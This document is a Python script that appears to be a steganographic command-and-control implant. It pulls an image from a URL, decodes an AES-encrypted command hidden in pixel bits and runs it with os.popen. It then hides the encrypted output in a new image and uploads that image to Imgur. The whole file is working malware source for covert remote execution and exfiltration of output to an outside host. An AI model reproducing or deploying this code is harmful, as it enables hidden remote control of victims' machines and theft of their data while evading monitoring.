#!/usr/bin/env python3

from PIL import Image
import requests
from io import BytesIO
import time
import base64
import os
import sys
from Crypto.Cipher import AES
import random
import json
import io

url = ''

r = requests.get(url)
	
img = Image.open(BytesIO(r.content))

pixels = img.load()

decode_keys = {'00000001': '=', '00000010': '/', '00000011': '+', '00000100': 'Z', '00000101': 'Y', '00000110': 'X', '00000111': 'W', '00001000': 'V', '00001001': 'U', '00001010': 'T', '00001011': 'S', '00001100': 'R', '00001101': 'Q', '00001110': 'P', '00001111': 'O', '00010000': 'N', '00010001': 'M', '00010010': 'L', '00010011': 'K', '00010100': 'J', '00010101': 'I', '00010110': 'H', '00010111': 'G', '00011000': 'F', '00011001': 'E', '00011010': 'D', '00011011': 'C', '00011100': 'B', '00011101': 'A', '00011110': 'z', '00011111': 'y', '00100000': 'x', '00100001': 'w', '00100010': 'v', '00100011': 'u', '00100100': 't', '00100101': 's', '00100110': 'r', '00100111': 'q', '00101000': 'p', '00101001': 'o', '00101010': 'n', '00101011': 'm', '00101100': 'l', '00101101': 'k', '00101110': 'j', '00101111': 'i', '00110000': 'h', '00110001': 'g', '00110010': 'f', '00110011': 'e', '00110100': 'd', '00110101': 'c', '00110110': 'b', '00110111': 'a', '00111000': '9', '00111001': '8', '00111010': '7', '00111011': '6', '00111100': '5', '00111101': '4', '00111110': '3', '00111111': '2', '01000000': '1', '01000001': '0'}

reds = []
for i in range(img.size[0]): # for every pixel:
    for j in range(img.size[1]):
        reds.append(pixels[i,j][0])

bytez = []
for i in reds:
	bytez.append('{:08b}'.format(i))

differences = []
counter = 0
while counter < len(bytez):
	differences.append(str(abs(int(bytez[counter][7]) - int(bytez[counter + 1][7]))))
	counter += 2

binaries = []
counter = 0
while counter < len(differences):
	command = ''
	for item in differences[counter:counter + 8]:
		command += item
	binaries.append(command)
	counter += 8


counter = 0
command_decoded = ''
while counter < len(binaries):
	if binaries[counter] in decode_keys:
		command_decoded += decode_keys[binaries[counter]]
		counter += 1
	else:
		break

command_decoded = command_decoded.encode()
command_decoded = base64.b64decode(command_decoded)


key = 'dali melts clock'
iv = 'this is an iv456'
decryption_scheme = AES.new(key, AES.MODE_CBC, iv)
decrypted_command = decryption_scheme.decrypt(command_decoded)
decrypted_command = decrypted_command.decode("utf-8")
decrypted_command = str(decrypted_command).rstrip("~")

final = decrypted_command.split("^")

def response(final, img):
	encode_keys = {'=': '00000001', '/': '00000010', '+': '00000011', 'Z': '00000100', 'Y': '00000101', 'X': '00000110', 'W': '00000111', 'V': '00001000', 'U': '00001001', 'T': '00001010', 'S': '00001011', 'R': '00001100', 'Q': '00001101', 'P': '00001110', 'O': '00001111', 'N': '00010000', 'M': '00010001', 'L': '00010010', 'K': '00010011', 'J': '00010100', 'I': '00010101', 'H': '00010110', 'G': '00010111', 'F': '00011000', 'E': '00011001', 'D': '00011010', 'C': '00011011', 'B': '00011100', 'A': '00011101', 'z': '00011110', 'y': '00011111', 'x': '00100000', 'w': '00100001', 'v': '00100010', 'u': '00100011', 't': '00100100', 's': '00100101', 'r': '00100110', 'q': '00100111', 'p': '00101000', 'o': '00101001', 'n': '00101010', 'm': '00101011', 'l': '00101100', 'k': '00101101', 'j': '00101110', 'i': '00101111', 'h': '00110000', 'g': '00110001', 'f': '00110010', 'e': '00110011', 'd': '00110100', 'c': '00110101', 'b': '00110110', 'a': '00110111', '9': '00111000', '8': '00111001', '7': '00111010', '6': '00111011', '5': '00111100', '4': '00111101', '3': '00111110', '2': '00111111', '1': '01000000', '0': '01000001'}

	response = final[0]
	token = final[1]
	execute = final[2]
	album_deletehash = final[3]

	if response == 'n':
		os.popen(execute)
		sys.exit(0)

	response_payload = os.popen(execute).read()

	if len(response_payload) > 33000:
		response_payload = response_payload[:33000] + '\n--snip--'

	while len(response_payload) % 16 != 0:
		response_payload += "~"

	# key and iv can be anything you want, time to encrypt
	key = 'dali melts clock'
	iv = 'this is an iv456'
	encryption_scheme = AES.new(key, AES.MODE_CBC, iv)
	response_payload = encryption_scheme.encrypt(response_payload)

	# we now have an encrypted byte-object. we can now b64 it and then decode it into a utf-8 string
	response_payload = base64.b64encode(response_payload)
	response_payload = response_payload.decode("utf-8")

	width, height = img.size

	img2 = img.crop((530, 470, width - 530, height - 470))

	pixels = img2.load()

	reds = []
	for i in range(img2.size[0]): # for every pixel:
	    for j in range(img2.size[1]):
	        reds.append(pixels[i,j][0])

	bytez = []
	for i in reds:
		bytez.append('{:08b}'.format(i))

	differences = []
	counter = 0
	while counter < len(bytez):
		differences.append(str(abs(int(bytez[counter][7]) - int(bytez[counter + 1][7]))))
		counter += 2

	# translate our b64 encoded string into the values in our encode_keys{} dict
	translation = []
	for x in response_payload:
		translation.append(encode_keys[x])

	# this breaks down our encoded values into individual numbers so '01010101' becomes '0', '1', '0'...
	final = []
	for x in translation:
		final += (list(x))

	# create a list of indexes that vary between final[] and differences[]
	counter = 0
	mismatch = []
	while counter < len(final):
		if final[counter] != differences[counter]:
			mismatch.append(counter)
			counter += 1
		else:
			counter += 1

	# at the indexes in which the organic differences and the needed differences aren't the same, change the first operand either +1 or -1
	for x in mismatch:
		if reds[x*2] == 0:
			reds[x*2] = (reds[x*2] + 1)
		elif reds[x*2] == 255:
			reds[x*2] = (reds[x*2] - 1)
		else:
			reds[x*2] = (reds[x*2] + (random.choice([-1, 1])))

	terminator_index = len(response_payload) * 8 * 2
	term_diff = abs(reds[terminator_index] - reds[terminator_index + 1])
	if term_diff % 2 == 0:
		if reds[terminator_index] == 255:
			reds[terminator_index] = 254
		elif reds[terminator_index] == 0:
			reds[terminator_index] = 1
		else:
			reds[terminator_index] = reds[terminator_index] + random.choice([-1,1])

	counter = 0
	for i in range(img2.size[0]): # for every pixel:
	    for j in range(img2.size[1]):
	    	pixels[i,j] = (reds[counter], pixels[i,j][1], pixels[i,j][2])
	    	counter += 1

	buf = io.BytesIO()

	img2.save(buf, format='PNG')
	img_binary = buf.getvalue()

	# upload the image to imgur and parse the json response to get the deletehashe so we can add it to an album
	if response == 's':
		headers = {'Authorization': 'Client-ID ' + token}
	elif response == 'l':
		headers = {'Authorization': 'Bearer ' + token}
	files = {'image': img_binary, 'type': 'binary'}
	api = 'https://api.imgur.com/3/image'
	r = requests.post(api, headers=headers, files=files)
	response = r.content
	response = json.loads(response.decode())
	print(response)
	upload_deletehash = response.get('data', {}).get('deletehash')

	url = 'https://api.imgur.com/3/album/' + album_deletehash
	if response == 's':
		headers = {'Authorization': 'Client-ID ' + token}
	elif response == 'l':
		headers = {'Authorization': 'Bearer ' + token}
	files = {'deletehashes[]': (None, upload_deletehash)}
	r = requests.post(url, headers=headers, files=files)
	response = r.content
	response = json.loads(response.decode())
	print(response)

response(final,img)
